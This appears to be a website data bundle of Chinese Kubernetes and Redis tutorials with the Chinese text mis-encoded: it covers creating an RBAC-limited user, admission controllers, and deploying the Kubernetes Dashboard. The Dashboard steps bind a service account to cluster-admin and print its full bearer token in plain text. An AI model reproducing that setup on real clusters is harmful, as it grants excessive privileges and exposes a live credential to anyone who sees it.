/etc/kubernetes/pki/\n[root@k8s-master01 pki]# (umask 077;openssl genrsa -out devman.key 2048)\n\n# 2) ç¨apiserverçè¯ä¹¦å»ç­¾ç½²\n# 2-1) ç­¾åç³è¯·ï¼ç³è¯·çç¨æ·æ¯devman,ç»æ¯devgroup\n[root@k8s-master01 pki]# openssl req -new -key devman.key -out devman.csr -subj "/cn=devman/o=devgroup"     \n# 2-2) ç­¾ç½²è¯ä¹¦\n[root@k8s-master01 pki]# openssl x509 -req -in devman.csr -ca ca.crt -cakey ca.key -cacreateserial -out devman.crt -days 3650\n\n# 3) è®¾ç½®éç¾¤ãç¨æ·ãä¸ä¸æä¿¡æ¯\n[root@k8s-master01 pki]# kubectl config set-cluster kubernetes --embed-certs=true --certificate-authority=/etc/kubernetes/pki/ca.crt --server=https://192.168.109.100:6443\n\n[root@k8s-master01 pki]# kubectl config set-credentials devman --embed-certs=true --client-certificate=/etc/kubernetes/pki/devman.crt --client-key=/etc/kubernetes/pki/devman.key\n\n[root@k8s-master01 pki]# kubectl config set-context devman@kubernetes --cluster=kubernetes --user=devman\n\n# åæ¢è´¦æ·å°devman\n[root@k8s-master01 pki]# kubectl config use-context devman@kubernetes\nswitched to context "devman@kubernetes".\n\n# æ¥çdevä¸podï¼åç°æ²¡ææé\n[root@k8s-master01 pki]# kubectl get pods -n dev\nerror from server (forbidden): pods is forbidden: user "devman" cannot list resource "pods" in api group "" in the namespace "dev"\n\n# åæ¢å°adminè´¦æ·\n[root@k8s-master01 pki]# kubectl config use-context kubernetes-admin@kubernetes\nswitched to context "kubernetes-admin@kubernetes".\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n2. åå»º role å rolebindingï¼ä¸º devman ç¨æ·ææ\n\nkind: role\napiversion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  namespace: dev\n  name: dev-role\nrules:\n- apigroups: [""]\n  resources: ["pods"]\n  verbs: ["get", "watch", "list"]\n  \n---\n\nkind: rolebinding\napiversion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  name: authorization-role-binding\n  namespace: dev\nsubjects:\n- kind: user\n  name: devman\n  apigroup: rbac.authorization.k8s.io\nroleref:\n  kind: role\n  name: dev-role\n  apigroup: rbac.authorization.k8s.io\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n[root@k8s-master01 pki]# kubectl create -f dev-role.yaml\nrole.rbac.authorization.k8s.io/dev-role created\nrolebinding.rbac.authorization.k8s.io/authorization-role-binding created\n\n\n1\n2\n3\n\n\n3. åæ¢è´¦æ·ï¼åæ¬¡éªè¯\n\n# åæ¢è´¦æ·å°devman\n[root@k8s-master01 pki]# kubectl config use-context devman@kubernetes\nswitched to context "devman@kubernetes".\n\n# åæ¬¡æ¥ç\n[root@k8s-master01 pki]# kubectl get pods -n dev\nname                                 ready   status             restarts   age\nnginx-deployment-66cb59b984-8wp2k    1/1     running            0          4d1h\nnginx-deployment-66cb59b984-dc46j    1/1     running            0          4d1h\nnginx-deployment-66cb59b984-thfck    1/1     running            0          4d1h\n\n# ä¸ºäºä¸å½±ååé¢çå­¦ä¹ ,ååadminè´¦æ·\n[root@k8s-master01 pki]# kubectl config use-context kubernetes-admin@kubernetes\nswitched to context "kubernetes-admin@kubernetes".\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# åå¥æ§å¶\n\néè¿äºåé¢çè®¤è¯åææä¹åï¼è¿éè¦ç»è¿åå¥æ§å¶å¤çéè¿ä¹åï¼apiserver æä¼å¤çè¿ä¸ªè¯·æ±ã\n\nåå¥æ§å¶æ¯ä¸ä¸ªå¯éç½®çæ§å¶å¨åè¡¨ï¼å¯ä»¥éè¿å¨ api-server ä¸éè¿å½ä»¤è¡è®¾ç½®éæ©æ§è¡åªäºåå¥æ§å¶å¨ï¼\n\n--admission-control=namespacelifecycle,limitranger,serviceaccount,persistentvolumelabel,\n                      defaultstorageclass,resourcequota,defaulttolerationseconds\n\n\n1\n2\n\n\nåªæå½ææçåå¥æ§å¶å¨é½æ£æ¥éè¿ä¹åï¼apiserver ææ§è¡è¯¥è¯·æ±ï¼å¦åè¿åæç»ã\n\nå½åå¯éç½®ç admission control åå¥æ§å¶å¦ä¸ï¼\n\n * alwaysadmitï¼åè®¸ææè¯·æ±\n * alwaysdenyï¼ç¦æ­¢ææè¯·æ±ï¼ä¸è¬ç¨äºæµè¯\n * alwayspullimagesï¼å¨å¯å¨å®¹å¨ä¹åæ»å»ä¸è½½éå\n * denyexeconprivilegedï¼å®ä¼æ¦æªæææ³å¨ privileged container ä¸æ§è¡å½ä»¤çè¯·æ±\n * imagepolicywebhookï¼è¿ä¸ªæä»¶å°åè®¸åç«¯çä¸ä¸ª webhook ç¨åºæ¥å®æ admission controller çåè½ã\n * service accountï¼å®ç° serviceaccount å®ç°äºèªå¨å\n * securitycontextdenyï¼è¿ä¸ªæä»¶å°ä½¿ç¨ securitycontext ç pod ä¸­çå®ä¹å¨é¨å¤±æ\n * resourcequotaï¼ç¨äºèµæºéé¢ç®¡çç®çï¼è§å¯ææè¯·æ±ï¼ç¡®ä¿å¨ namespace ä¸çéé¢ä¸ä¼è¶æ \n * limitrangerï¼ç¨äºèµæºéå¶ç®¡çï¼ä½ç¨äº namespace ä¸ï¼ç¡®ä¿å¯¹ pod è¿è¡èµæºéå¶\n * initialresourcesï¼ä¸ºæªè®¾ç½®èµæºè¯·æ±ä¸éå¶ç podï¼æ ¹æ®å¶éåçåå²èµæºçä½¿ç¨æåµè¿è¡è®¾ç½®\n * namespacelifecycleï¼å¦æå°è¯å¨ä¸ä¸ªä¸å­å¨ç namespace ä¸­åå»ºèµæºå¯¹è±¡ï¼åè¯¥åå»ºè¯·æ±å°è¢«æç»ãå½å é¤ä¸ä¸ª namespace æ¶ï¼ç³»ç»å°ä¼å é¤è¯¥ namespace ä¸­ææå¯¹è±¡ã\n * defaultstorageclassï¼ä¸ºäºå®ç°å±äº«å­å¨çå¨æä¾åºï¼ä¸ºæªæå® storageclass æ pv ç pvc å°è¯å¹éé»è®¤ç storageclassï¼å°½å¯è½åå°ç¨æ·å¨ç³è¯· pvc æ¶æéäºè§£çåç«¯å­å¨ç»è\n * defaulttolerationsecondsï¼è¿ä¸ªæä»¶ä¸ºé£äºæ²¡æè®¾ç½® forgiveness tolerations å¹¶å·æ notready:noexecute å unreachable:noexecute ä¸¤ç§ taints ç pod è®¾ç½®é»è®¤ç âå®¹å¿â æ¶é´ï¼ä¸º 5min\n * podsecuritypolicyï¼è¿ä¸ªæä»¶ç¨äºå¨åå»ºæä¿®æ¹ pod æ¶å³å®æ¯å¦æ ¹æ® pod ç security context åå¯ç¨ç podsecuritypolicy å¯¹ pod çå®å¨ç­ç¥è¿è¡æ§å¶',charsets:{cjk:!0}},{title:"kubernetes(åä¸) DashBoard",frontmatter:{title:"kubernetes(åä¸) DashBoard",date:"2023-06-25T09:22:36.000Z",permalink:"/kubernetes/612",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/60.Kubernetes/612.kubernetes(%E5%8D%81%E4%B8%89)%20DashBoard.html",relativePath:"01.è¿ç»´/60.Kubernetes/612.kubernetes(åä¸) DashBoard.md",key:"v-a2835a8a",path:"/kubernetes/612/",headers:[{level:2,title:"é¨ç½²Dashboard",slug:"é¨ç½²dashboard",normalizedTitle:"é¨ç½² dashboard",charIndex:172},{level:2,title:"ä½¿ç¨DashBoard",slug:"ä½¿ç¨dashboard",normalizedTitle:"ä½¿ç¨ dashboard",charIndex:3508}],lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:"é¨ç½²Dashboard ä½¿ç¨DashBoard",content:"ä¹åå¨ kubernetes ä¸­å®æçæææä½é½æ¯éè¿å½ä»¤è¡å·¥å· kubectl å®æçãå¶å®ï¼ä¸ºäºæä¾æ´ä¸°å¯çç¨æ·ä½éªï¼kubernetes è¿å¼åäºä¸ä¸ªåºäº web çç¨æ·çé¢ï¼Dashboardï¼ãç¨æ·å¯ä»¥ä½¿ç¨ Dashboard é¨ç½²å®¹å¨åçåºç¨ï¼è¿å¯ä»¥çæ§åºç¨çç¶æï¼æ§è¡æéææ¥ä»¥åç®¡ç kubernetes ä¸­åç§èµæºã\n\n\n# é¨ç½² Dashboard\n\n1. ä¸è½½ yamlï¼å¹¶è¿è¡ Dashboard\n\n# ä¸è½½yaml\n[root@k8s-master01 ~]# wget  https://raw.githubusercontent.com/kubernetes/dashboard/v2.0.0/aio/deploy/recommended.yaml\n\n# ä¿®æ¹kubernetes-dashboardçServiceç±»å\nkind: Service\napiVersion: v1\nmetadata:\n  labels:\n    k8s-app: kubernetes-dashboard\n  name: kubernetes-dashboard\n  namespace: kubernetes-dashboard\nspec:\n  type: NodePort  # æ°å¢\n  ports:\n    - port: 443\n      targetPort: 8443\n      nodePort: 30009  # æ°å¢\n  selector:\n    k8s-app: kubernetes-dashboard\n\n# é¨ç½²\n[root@k8s-master01 ~]# kubectl create -f recommended.yaml\n\n# æ¥çnamespaceä¸çkubernetes-dashboardä¸çèµæº\n[root@k8s-master01 ~]# kubectl get pod,svc -n kubernetes-dashboard\nNAME                                            READY   STATUS    RESTARTS   AGE\npod/dashboard-metrics-scraper-c79c65bb7-zwfvw   1/1     Running   0          111s\npod/kubernetes-dashboard-56484d4c5-z95z5        1/1     Running   0          111s\n\nNAME                               TYPE       CLUSTER-IP      EXTERNAL-IP  PORT(S)         AGE\nservice/dashboard-metrics-scraper  ClusterIP  10.96.89.218    <none>       8000/TCP        111s\nservice/kubernetes-dashboard       NodePort   10.104.178.171  <none>       443:30009/TCP   111s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n2. åå»ºè®¿é®è´¦æ·ï¼è·å token\n\n# åå»ºè´¦å·\n[root@k8s-master01-1 ~]# kubectl create serviceaccount dashboard-admin -n kubernetes-dashboard\n\n# ææ\n[root@k8s-master01-1 ~]# kubectl create clusterrolebinding dashboard-admin-rb --clusterrole=cluster-admin --serviceaccount=kubernetes-dashboard:dashboard-admin\n\n# è·åè´¦å·token\n[root@k8s-master01 ~]#  kubectl get secrets -n kubernetes-dashboard | grep dashboard-admin\ndashboard-admin-token-xbqhh        kubernetes.io/service-account-token   3      2m35s\n\n[root@k8s-master01 ~]# kubectl describe secrets dashboard-admin-token-xbqhh -n kubernetes-dashboard\nName:         dashboard-admin-token-xbqhh\nNamespace:    kubernetes-dashboard\nLabels:       <none>\nAnnotations:  kubernetes.io/service-account.name: dashboard-admin\n              kubernetes.io/service-account.uid: 95d84d80-be7a-4d10-a2e0-68f90222d039\n\nType:  kubernetes.io/service-account-token\n\nData\n====\nnamespace:  20 bytes\ntoken:      eyJhbGciOiJSUzI1NiIsImtpZCI6ImJrYkF4bW5XcDhWcmNGUGJtek5NODFuSXl1aWptMmU2M3o4LTY5a2FKS2cifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlcm5ldGVzLWRhc2hib2FyZCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJkYXNoYm9hcmQtYWRtaW4tdG9rZW4teGJxaGgiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGFzaGJvYXJkLWFkbWluIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiOTVkODRkODAtYmU3YS00ZDEwLWEyZTAtNjhmOTAyMjJkMDM5Iiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50Omt1YmVybmV0ZXMtZGFzaGJvYXJkOmRhc2hib2FyZC1hZG1pbiJ9.NAl7e8ZfWWdDoPxkqzJzTB46sK9E8iuJYnUI9vnBaY3Jts7T1g1msjsBnbxzQSYgAG--cV0WYxjndzJY_UWCwaGPrQrt_GunxmOK9AUnzURqm55GR2RXIZtjsWVP2EBatsDgHRmuUbQvTFOvdJB4x3nXcYLN2opAaMqg3rnU2rr-A8zCrIuX_eca12wIp_QiuP3SF-tzpdLpsyRfegTJZl6YnSGyaVkC9id-cxZRb307qdCfXPfCHR_2rt5FVfxARgg_C0e3eFHaaYQO7CitxsnIoIXpOFNAR8aUrmopJyODQIPqBWUehb7FhlU1DCduHnIIXVC_UICZ-MKYewBDLw\nca.crt:     1025 bytes\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n3. éè¿æµè§å¨è®¿é® Dashboard ç UI\nå¨ç»å½é¡µé¢ä¸è¾å¥ä¸é¢ç token\n\n\n\nåºç°ä¸é¢çé¡µé¢ä»£è¡¨æå\n\n\n\n\n# ä½¿ç¨ DashBoard\n\næ¥ç\néæ©æå®çå½åç©ºé´ dev ï¼ç¶åç¹å» Deployments ï¼æ¥ç dev ç©ºé´ä¸çææ deployment\n\n\n\næ©ç¼©å®¹\nå¨ Deployment ä¸ç¹å» è§æ¨¡ ï¼ç¶åæå® ç®æ å¯æ¬æ°é ï¼ç¹å»ç¡®å®\n\n\n\nç¼è¾\nå¨ Deployment ä¸ç¹å» ç¼è¾ ï¼ç¶åä¿®æ¹ yamlæä»¶ ï¼ç¹å»ç¡®å®\n\n\n\næ¥ç Pod\nç¹å» Pods , æ¥ç pods åè¡¨\n\n\n\næä½ Pod\néä¸­æä¸ª Podï¼å¯ä»¥å¯¹å¶æ§è¡æ¥å¿ï¼logsï¼ãè¿å¥æ§è¡ï¼execï¼ãç¼è¾ãå é¤æä½\n\n",normalizedContent:"ä¹åå¨ kubernetes ä¸­å®æçæææä½é½æ¯éè¿å½ä»¤è¡å·¥å· kubectl å®æçãå¶å®ï¼ä¸ºäºæä¾æ´ä¸°å¯çç¨æ·ä½éªï¼kubernetes è¿å¼åäºä¸ä¸ªåºäº web çç¨æ·çé¢ï¼dashboardï¼ãç¨æ·å¯ä»¥ä½¿ç¨ dashboard é¨ç½²å®¹å¨åçåºç¨ï¼è¿å¯ä»¥çæ§åºç¨çç¶æï¼æ§è¡æéææ¥ä»¥åç®¡ç kubernetes ä¸­åç§èµæºã\n\n\n# é¨ç½² dashboard\n\n1. ä¸è½½ yamlï¼å¹¶è¿è¡ dashboard\n\n# ä¸è½½yaml\n[root@k8s-master01 ~]# wget  https://raw.githubusercontent.com/kubernetes/dashboard/v2.0.0/aio/deploy/recommended.yaml\n\n# ä¿®æ¹kubernetes-dashboardçserviceç±»å\nkind: service\napiversion: v1\nmetadata:\n  labels:\n    k8s-app: kubernetes-dashboard\n  name: kubernetes-dashboard\n  namespace: kubernetes-dashboard\nspec:\n  type: nodeport  # æ°å¢\n  ports:\n    - port: 443\n      targetport: 8443\n      nodeport: 30009  # æ°å¢\n  selector:\n    k8s-app: kubernetes-dashboard\n\n# é¨ç½²\n[root@k8s-master01 ~]# kubectl create -f recommended.yaml\n\n# æ¥çnamespaceä¸çkubernetes-dashboardä¸çèµæº\n[root@k8s-master01 ~]# kubectl get pod,svc -n kubernetes-dashboard\nname                                            ready   status    restarts   age\npod/dashboard-metrics-scraper-c79c65bb7-zwfvw   1/1     running   0          111s\npod/kubernetes-dashboard-56484d4c5-z95z5        1/1     running   0          111s\n\nname                               type       cluster-ip      external-ip  port(s)         age\nservice/dashboard-metrics-scraper  clusterip  10.96.89.218    <none>       8000/tcp        111s\nservice/kubernetes-dashboard       nodeport   10.104.178.171  <none>       443:30009/tcp   111s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n2. åå»ºè®¿é®è´¦æ·ï¼è·å token\n\n# åå»ºè´¦å·\n[root@k8s-master01-1 ~]# kubectl create serviceaccount dashboard-admin -n kubernetes-dashboard\n\n# ææ\n[root@k8s-master01-1 ~]# kubectl create clusterrolebinding dashboard-admin-rb --clusterrole=cluster-admin --serviceaccount=kubernetes-dashboard:dashboard-admin\n\n# è·åè´¦å·token\n[root@k8s-master01 ~]#  kubectl get secrets -n kubernetes-dashboard | grep dashboard-admin\ndashboard-admin-token-xbqhh        kubernetes.io/service-account-token   3      2m35s\n\n[root@k8s-master01 ~]# kubectl describe secrets dashboard-admin-token-xbqhh -n kubernetes-dashboard\nname:         dashboard-admin-token-xbqhh\nnamespace:    kubernetes-dashboard\nlabels:       <none>\nannotations:  kubernetes.io/service-account.name: dashboard-admin\n              kubernetes.io/service-account.uid: 95d84d80-be7a-4d10-a2e0-68f90222d039\n\ntype:  kubernetes.io/service-account-token\n\ndata\n====\nnamespace:  20 bytes\ntoken:      eyjhbgcioijsuzi1niisimtpzci6imjrykf4bw5xcdhwcmngugjtek5nodfusxl1awptmmu2m3o4lty5a2fks2cifq.eyjpc3mioijrdwjlcm5ldgvzl3nlcnzpy2vhy2nvdw50iiwia3vizxjuzxrlcy5pby9zzxj2awnlywnjb3vudc9uyw1lc3bhy2uioijrdwjlcm5ldgvzlwrhc2hib2fyzcisimt1ymvybmv0zxmuaw8vc2vydmljzwfjy291bnqvc2vjcmv0lm5hbwuioijkyxnoym9hcmqtywrtaw4tdg9rzw4tegjxaggilcjrdwjlcm5ldgvzlmlvl3nlcnzpy2vhy2nvdw50l3nlcnzpy2utywnjb3vudc5uyw1lijoizgfzagjvyxjklwfkbwluiiwia3vizxjuzxrlcy5pby9zzxj2awnlywnjb3vudc9zzxj2awnllwfjy291bnqudwlkijoiotvkodrkodatymu3ys00zdewlweyztatnjhmotaymjjkmdm5iiwic3viijoic3lzdgvtonnlcnzpy2vhy2nvdw50omt1ymvybmv0zxmtzgfzagjvyxjkomrhc2hib2fyzc1hzg1pbij9.nal7e8zfwwddopxkqzjztb46sk9e8iujynui9vnbay3jts7t1g1msjsbnbxzqsygag--cv0wyxjndzjy_uwcwagprqrt_gunxmok9aunzurqm55gr2rxiztjswvp2ebatsdghrmuubqvtfovdjb4x3nxcyln2opaamqg3rnu2rr-a8zcriux_eca12wip_qiup3sf-tzpdlpsyrfegtjzl6ynsgyavkc9id-cxzrb307qdcfxpfchr_2rt5fvfxargg_c0e3efhaayqo7citxsnioixpofnar8aurmopjyodqipqbwuehb7fhlu1dcduhniixvc_uicz-mkyewbdlw\nca.crt:     1025 bytes\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n3. éè¿æµè§å¨è®¿é® dashboard ç ui\nå¨ç»å½é¡µé¢ä¸è¾å¥ä¸é¢ç token\n\n\n\nåºç°ä¸é¢çé¡µé¢ä»£è¡¨æå\n\n\n\n\n# ä½¿ç¨ dashboard\n\næ¥ç\néæ©æå®çå½åç©ºé´ dev ï¼ç¶åç¹å» deployments ï¼æ¥ç dev ç©ºé´ä¸çææ deployment\n\n\n\næ©ç¼©å®¹\nå¨ deployment ä¸ç¹å» è§æ¨¡ ï¼ç¶åæå® ç®æ å¯æ¬æ°é ï¼ç¹å»ç¡®å®\n\n\n\nç¼è¾\nå¨ deployment ä¸ç¹å» ç¼è¾ ï¼ç¶åä¿®æ¹ yamlæä»¶ ï¼ç¹å»ç¡®å®\n\n\n\næ¥ç pod\nç¹å» pods , æ¥ç pods åè¡¨\n\n\n\næä½ pod\néä¸­æä¸ª podï¼å¯ä»¥å¯¹å¶æ§è¡æ¥å¿ï¼logsï¼ãè¿å¥æ§è¡ï¼execï¼ãç¼è¾ãå é¤æä½\n\n",charsets:{cjk:!0}},{title:"Redis ä»ç»",frontmatter:{title:"Redis ä»ç»",date:"2023-06-25T09:22:36.000Z",permalink:"/redis/1600",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E4%B8%AD%E9%97%B4%E4%BB%B6/03.redis/1600.Redis%E4%BB%8B%E7%BB%8D.html",relativePath:"04.ä¸­é´ä»¶/03.redis/1600.Redisä»ç».md",key:"v-46a82521",path:"/redis/1600/",headers:[{level:2,title:"Redisçæ¥å",slug:"redisçæ¥å",normalizedTitle:"redis çæ¥å",charIndex:174},{level:2,title:"ä¸ºä½éè¦Redis",slug:"ä¸ºä½éè¦redis",normalizedTitle:"ä¸ºä½éè¦ redis",charIndex:423},{level:2,title:"Redisçåè½",slug:"redisçåè½",normalizedTitle:"redis çåè½",charIndex:676},{level:2,title:"Redisçåºç¨åºæ¯",slug:"redisçåºç¨åºæ¯",normalizedTitle:"redis çåºç¨åºæ¯",charIndex:1139},{level:2,title:"Redisçæªæ¥",slug:"redisçæªæ¥",normalizedTitle:"redis çæªæ¥",charIndex:1973}],lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:"Redisçæ¥å ä¸ºä½éè¦Redis Redisçåè½ Redisçåºç¨åºæ¯ Redisçæªæ¥",content:"Redisï¼REmote DIctionary Serverï¼æ¯ä¸ä¸ªå¼æºçä½¿ç¨ ANSI C ç¼åãæ¯æç½ç»ãå¯åºäºåå­äº¦å¯æä¹åçæ¥å¿åãKey-Value æ°æ®åºï¼å¹¶æä¾å¤ç§è¯­è¨ç APIãä»åå­ä¸çï¼Redis çåç§°æ¥èªè¥¿ç­çç âçº¢è²â è¿ä¸ªè¯ï¼æå³ç âçº¢è²ç¯ç¬¼â æ âçº¢è²æå¸âï¼è¡¨ç¤ºå¯¹æ°æ®åºå¿«éãå¯æ©å±ãé«å¯é æ§çè¿½æ±ã\n\n\n# Redis çæ¥å\n\nRedis çè¯çå¯ä»¥è¿½æº¯å° 2009 å¹´ï¼å½æ¶ Salvatore Sanfilippoï¼å³ antirezï¼ä¸ºäºè§£å³èªå·±å¨ä½¿ç¨ Memcached æ¶éå°çä¸äºé®é¢ï¼å¼å§å¼å RedisãMemcached æ¯ä¸ä¸ªå¼æºçåå­ä¸­çæ°æ®ç¼å­ç³»ç»ï¼ä¸»è¦ç¨äºåå°æ°æ®åºè®¿é®æ¬¡æ°ï¼ä»¥æé«ç½ç«çè®¿é®éåº¦ãç¶èï¼Sanfilippo åç° Memcached çåè½è¿äºç®åï¼æ æ³æ»¡è¶³ä¸äºå¤æçéæ±ï¼å¦æ°æ®æä¹ååæ°æ®åæ­¥ç­ãå æ­¤ï¼ä»å³å®å¼åä¸ä¸ªå¨æ°çæ°æ®åºï¼ä»¥æ»¡è¶³è¿äºéæ±ã\n\n\n# ä¸ºä½éè¦ Redis\n\néçäºèç½çåå±ï¼æ°æ®éä¸æ­å¢é¿ï¼ä¼ ç»çå³ç³»åæ°æ®åºå¨å¤çå¤§éæ°æ®æ¶ï¼æ§è½éæ¸ä¸éãåæ¶ï¼éçåå¸å¼ç³»ç»çæ®åï¼æ°æ®ä¸è´æ§ååæ­¥é®é¢ä¹åå¾è¶æ¥è¶çªåºãRedis çåºç°ï¼å°±æ¯ä¸ºäºè§£å³è¿äºé®é¢ã\n\né¦åï¼Redis æ¯åå­æ°æ®åºï¼è¯»åéåº¦éå¸¸å¿«ï¼å¯ä»¥æ»¡è¶³é«å¹¶åãå¤§æ°æ®éçå¤çéæ±ãå¶æ¬¡ï¼Redis æ¯æå¤ç§æ°æ®ç»æï¼åæ¬å­ç¬¦ä¸²ãåå¸ãåè¡¨ãéååæåºéåç­ï¼å¯ä»¥æ»¡è¶³åç§å¤æçä¸å¡éæ±ãæåï¼Redis è¿æä¾äºä¸°å¯çæ°æ®æä½åäºå¡æ§å¶åè½ï¼å¯ä»¥ä¿è¯æ°æ®çä¸è´æ§åå¯é æ§ã\n\n\n# Redis çåè½\n\n 1. æ°æ®ç»æï¼Redis æ¯æå¤ç§æ°æ®ç»æï¼åæ¬å­ç¬¦ä¸²ãåå¸ãåè¡¨ãéååæåºéåç­ãè¿äºæ°æ®ç»æå¯ä»¥æ»¡è¶³åç§å¤æçä¸å¡éæ±ã\n 2. æ°æ®æä½ï¼Redis æä¾äºä¸°å¯çæ°æ®æä½åäºå¡æ§å¶åè½ï¼åæ¬å¢å ãå é¤ãä¿®æ¹åæ¥è¯¢ç­æä½ãåæ¶ï¼Redis è¿æ¯æäºå¡æ§å¶åä¹è§éç­æºå¶ï¼å¯ä»¥ä¿è¯æ°æ®çä¸è´æ§åå¯é æ§ã\n 3. æ°æ®æä¹åï¼Redis æ¯æå¤ç§æ°æ®æä¹åæ¹å¼ï¼åæ¬ RDB å AOF ç­ãRDB éè¿çææ°æ®å¿«ç§çæ¹å¼è¿è¡æä¹åï¼è AOF åéè¿è®°å½æä½æ¥å¿çæ¹å¼è¿è¡æä¹åãè¿ä¸¤ç§æ¹å¼é½å¯ä»¥ä¿è¯æ°æ®çå¯é æ§åæ¢å¤è½åã\n 4. æ°æ®åæ­¥ï¼Redis æ¯æä¸»ä»å¤å¶åéç¾¤å¤å¶ä¸¤ç§æ¹å¼è¿è¡æ°æ®åæ­¥ãä¸»ä»å¤å¶å¯ä»¥å®ç°è¯»ååç¦»åè´è½½åè¡¡ç­åè½ï¼èéç¾¤å¤å¶åå¯ä»¥å®ç°æ°æ®çåå¸å¼å­å¨åå®¹ç¾ç­åè½ã\n 5. åå¸å¼éï¼Redis æä¾äºåå¸å¼éåè½ï¼å¯ä»¥å¨åå¸å¼ç³»ç»ä¸­å®ç°èµæºå±äº«åå¹¶åæ§å¶ç­åè½ã\n 6. å¶ä»åè½ï¼é¤äºä¸è¿°åè½å¤ï¼Redis è¿æ¯ææ¶æ¯éåãåå¸è®¢éãLua èæ¬ç­åè½ã\n\n\n# Redis çåºç¨åºæ¯\n\n 1.  ç¼å­ï¼Redis ä½ä¸ºåå­æ°æ®åºï¼è¯»åéåº¦éå¸¸å¿«ï¼å¯ä»¥ä½ä¸ºç¼å­å±ä½¿ç¨ãéè¿å°ç­ç¹æ°æ®å­å¨å¨ Redis ä¸­ï¼å¯ä»¥åå°å¯¹åç«¯æ°æ®åºçè®¿é®æ¬¡æ°ï¼æé«ç½ç«çè®¿é®éåº¦ã\n 2.  åå¸å¼ç³»ç»ï¼Redis æ¯æåå¸å¼å­å¨åå¤å¶ç­åè½ï¼å¯ä»¥ç¨äºæå»ºåå¸å¼ç³»ç»ãéè¿å°æ°æ®åæ£å°å¤ä¸ªèç¹ä¸å­å¨ï¼å¯ä»¥å®ç°æ°æ®çåå¸å¼å¤çåå®¹ç¾ç­åè½ã\n 3.  æ¶æ¯éåï¼Redis å¯ä»¥ä½ä¸ºæ¶æ¯éåä½¿ç¨ï¼å¯ä»¥å®ç°å¼æ­¥å¤çåæ¶æ¯çåå¸è®¢éç­åè½ãéè¿å°æ¶æ¯å­å¨å¨ Redis ä¸­ï¼å¯ä»¥å®ç°æ¶æ¯çæä¹ååå¯é ä¼ è¾ç­åè½ã\n 4.  æ°æ®åºæ©å±ï¼Redis å¯ä»¥ä½ä¸ºæ°æ®åºçæ©å±ä½¿ç¨ï¼å¯ä»¥å®ç°æ°æ®çå¿«éè¯»ååå¤çç­åè½ãéè¿å°é¨åæ°æ®å­å¨å¨ Redis ä¸­ï¼å¯ä»¥åè½»æ°æ®åºçååï¼æé«ç³»ç»çæ§è½åå¯é æ§ã\n 5.  å®æ¶åæï¼Redis çå¿«éè¯»åè½åä½¿å¶æä¸ºå®æ¶åæå·¥å·ççæ³éæ©ãå®å¯ä»¥ä½ä¸ºæ°æ®ç¼å²å±ï¼ä¸ºå®æ¶åææä¾è¶³å¤çæ°æ®å­å¨ç©ºé´åæ¥è¯¢æ§è½ã\n 6.  ç¤¾äº¤ç½ç»ï¼Redis å¯ä»¥ç¨äºå®ç°ç¤¾äº¤ç½ç»ä¸­çåç§åè½ï¼å¦ç¨æ·è®¤è¯ãåå®¹åå¸ãå¥½åå³ç³»ç®¡çç­ãå®çé«éè¯»ååä¸°å¯çæ°æ®ç»æä½¿å¾è¿äºæä½åå¾ç®åé«æã\n 7.  æ¸¸æå¼åï¼å¨æ¸¸æå¼åä¸­ï¼Redis å¯ä»¥ä½ä¸ºåç«¯æå¡å¨çä¸é¨åæ¥å¤çæ¸¸æé»è¾åç©å®¶æ°æ®ãå®æä¾çé«æ§è½åå¿«éååºä½¿å¾æ¸¸æä½éªæ´å æµçã\n 8.  ç©èç½ï¼å¨ç©èç½åºç¨ä¸­ï¼Redis å¯ä»¥ç¨äºå­å¨åç®¡çä¼ æå¨æ°æ®ãè®¾å¤ç¶æç­ä¿¡æ¯ãå®çæä¹åååå¸å¼ç¹æ§ä½¿å¾ç©èç½è®¾å¤è½å¤å¯é å°å±äº«ååæ­¥æ°æ®ã\n 9.  ç¼å­ç½å³ï¼Redis å¯ä»¥ä½ä¸ºç¼å­ç½å³æ¥ä¼å API è¯·æ±çæ§è½ãå®è½å¤å¿«éå°ååº API è¯·æ±å¹¶åå°å¯¹åç«¯æå¡çè°ç¨æ¬¡æ°ï¼ä»èæé«ç³»ç»çååéåååºéåº¦ã\n 10. å®æ¶æ¨èç³»ç»ï¼å¨å®æ¶æ¨èç³»ç»ä¸­ï¼Redis 